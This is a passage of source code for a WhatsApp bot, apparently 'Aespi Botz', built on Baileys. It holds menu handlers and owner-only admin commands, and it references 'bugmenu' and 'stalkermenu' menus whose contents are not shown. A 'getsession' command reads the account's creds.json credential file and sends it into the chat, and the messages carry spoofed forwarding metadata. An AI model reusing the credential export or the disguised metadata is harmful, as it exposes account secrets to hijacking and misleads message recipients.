  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${groupmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'convertmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${convertmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'religionmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${religionmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'animemenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${animemenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'randomphotomenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${randomphotomenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'stickermenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${stickermenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'databasemenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${databasemenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'storemenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${storemenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'stalkermenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${stalkermenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'bugmenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${bugmenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
case 'othermenu': {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${othermenu}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                	newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
break
            case 'statustext': 
            case 'upswtext':
            case 'upswteks': {
               if (!aespispTheCreator) return aespispStickOwner()
               if (!q) return replygcaespisp('Text?')
               await ArielStore.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.data.users) })
               replygcaespisp(mess.done)
            }
            break
            case 'statusvideo':
            case 'upswvideo': {
               if (!aespispTheCreator) return aespispStickOwner()
               if (/video/.test(mime)) {
                  var videosw = await ArielStore.downloadAndSaveMediaMessage(quoted)
                  await ArielStore.sendMessage('status@broadcast', {
                     video: {
                        url: videosw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users) })
                  await replygcaespisp(mess.done)
               } else {
                  replygcaespisp('Reply to video')
               }
            }
            break
            case 'statusimg':
            case 'statusimage':
            case 'upswimg': {
               if (!aespispTheCreator) return aespispStickOwner()
               if (/image/.test(mime)) {
                  var imagesw = await ArielStore.downloadAndSaveMediaMessage(quoted)
                  await ArielStore.sendMessage('status@broadcast', {
                     image: {
                        url: imagesw
                     },
                     caption: q ? q : ''
                  }, { statusJidList: Object.keys(global.db.data.users)})
                  await replygcaespisp(mess.done)
               } else {
                  replygcaespisp('Reply to image')
               }
            }
            break
            case 'statusaudio':
            case 'upswaudio': {
               if (!aespispTheCreator) return aespispStickOwner()
               if (/audio/.test(mime)) {
                  var audiosw = await ArielStore.downloadAndSaveMediaMessage(quoted)
                  await ArielStore.sendMessage('status@broadcast', {
                     audio: {
                        url: audiosw
                     },
                     mimetype: 'audio/mp4',
                     ptt: true
                  }, {
                     backgroundColor: '#FF000000',
                     statusJidList: Object.keys(global.db.data.users)
                  })
                  await replygcaespisp(mess.done)
               } else {
                  replygcaespisp('Reply to audio')
               }
            }
            break
            case 'setimgmenu':
            case 'sim': {
                if (!aespispTheCreator) return aespispStickOwner()
                let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './ArielFolder/theme/aespixyz.jpg')
                fs.unlinkSync(delb)
                replygcaespisp(mess.done)
            }
            break
            case 'setvidmenu':
            case 'svm': 
            	case 'setvgifmenu':
            case 'sgm': {
                if (!aespispTheCreator) return aespispStickOwner()
                let delb = await ArielStore.downloadAndSaveMediaMessage(quoted)
                await fsx.copy(delb, './ArielFolder/theme/Aespi-Botz.mp4')
                fs.unlinkSync(delb)
                replygcaespisp(mess.done)
            }
            break
            case 'addtitle':{
               if (!aespispTheCreator) return aespispStickOwner()
               if (!text) return replygcaespisp(`Usage ${prefix + command} number|title`)
               nonya = text.split('|')[0]
               titlenya = text.split('|')[1]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = titlenya
               await replygcaespisp(mess.done)
            }
            break
            case 'deltitle':{
               if (!aespispTheCreator) return aespispStickOwner()
               if (!text) return replygcaespisp(`Usage ${prefix + command} number`)
               nonya = text.split(',')[0]
               let oo = `${nonya}@s.whatsapp.net`
               db.data.users[oo].title = ''
               await replygcaespisp(mess.done)
            }
            break
            case 'addlimit':
            case 'givelimit':{
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                let oo = `${usernya}@s.whatsapp.net`
                db.data.users[oo].limit += limitnya
                replygcaespisp(mess.done)
            }
            break
            case 'dellimit':{
                if (!aespispTheCreator) return aespispStickOwner()
                if (!text) return replygcaespisp(`Usage ${prefix + command} number|limit amount`)
                usernya = text.split('|')[0]
                limitnya = text.split('|')[1]
                if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return replygcaespisp(`His Limit Is Less Than ${limitnya}`)
                db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
                replygcaespisp(mess.done)
            }
            break
            case 'addprem':
                if (!aespispTheCreator) return aespispStickOwner()
                if (args.length < 2)
                    return replygcaespisp(`Usage ${prefix + command} @tag time\n${prefix + command} number time\n\nExample : ${prefix + command} @tag 30d`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium)
                    }
                    replygcaespisp("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium)
                    replygcaespisp("Premium Success")
                }
            break
            case 'delprem':
                if (!aespispTheCreator) return aespispStickOwner()
                if (args.length < 1) return replygcaespisp(`Usage ${prefix + command} @tag\n${prefix + command} number\n\nExample : ${prefix + command} 916909137213`)
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1)
                        fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    }
                    replygcaespisp("Delete Success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1)
                    fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium))
                    replygcaespisp("Delete Success")
                }
            break
            case 'listprem': {
                if (!aespispTheCreator) return aespispStickOwner()
                let data = require('./src/data/role/premium.json')
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let x of data) {
                    txt += `Number : ${x.id}\n`
                    txt += `Expire In: ${x.expired} ms\n`
                ArielStore.sendMessage(m.chat, {
                    text: txt,
                    mentions: x
                }, {
                    quoted: m
                })
                }
            }
            break
case 'addowner':
if (!aespispTheCreator) return aespispStickOwner()
if (!args[0]) return replygcaespisp(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ArielStore.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygcaespisp(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcaespisp(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!aespispTheCreator) return aespispStickOwner()
if (!args[0]) return replygcaespisp(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./src/data/role/owner.json', JSON.stringify(owner))
replygcaespisp(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                replygcaespisp(teks)
            }
            break
            case 'delsession':
            case 'clearsession': {
                if (!aespispTheCreator) return aespispStickOwner()
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcaespisp('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcaespisp(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcaespisp(teks)
                    await sleep(2000)
                    replygcaespisp("Deleting junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcaespisp("Successfully deleted all the trash in the session folder")
                });
            }
            break
            case 'join':
                try {
                    if (!aespispTheCreator) return aespispStickOwner()
                    if (!text) return replygcaespisp('Enter Group Link!')
                    if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcaespisp('Link Invalid!')
                    let result = args[0].split('https://chat.whatsapp.com/')[1]
                    ArielStore.groupAcceptInvite(result)
                    await replygcaespisp(`Done`)
                } catch {
                    replygcaespisp('Failed to join the Group')
                }
                break
            case 'getsession':
                if (!aespispTheCreator) return aespispStickOwner()
                replygcaespisp('Wait a moment, currently retrieving your session file')
                let sesi = fs.readFileSync('./session/creds.json')
                ArielStore.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
            case 'myip':
            case 'ipbot':
                if (!aespispTheCreator) return aespispStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcaespisp("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return replygcaespisp(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                ArielStore.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            ArielStore.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
            case 'shutdown':
                if (!aespispTheCreator) return aespispStickOwner()
                replygcaespisp(`Restarting will be completed in seconds`)
                await sleep(3000)
                process.exit()
            break
            case 'autoread':
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    replygcaespisp(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    replygcaespisp(`Successfully changed autoread to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE",
"title":"CHOOSE ",
"description":"ENABLE",
"id":"${prefix+command} on"},
{"header":"DISABLE",
"title":"CHOOSE ",
"description":"DISABLE",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'unavailable':
                if (!aespispTheCreator) return aespispStickOwner()
                if (q === 'on') {
                    db.data.settings[botNumber].online = true
                    replygcaespisp(`Successfully changed unavailable to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].online = false
                    replygcaespisp(`Successfully changed unavailable to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecordtype':
                if (!aespispTheCreator) return aespispStickOwner()
                
                if (q === 'on') {
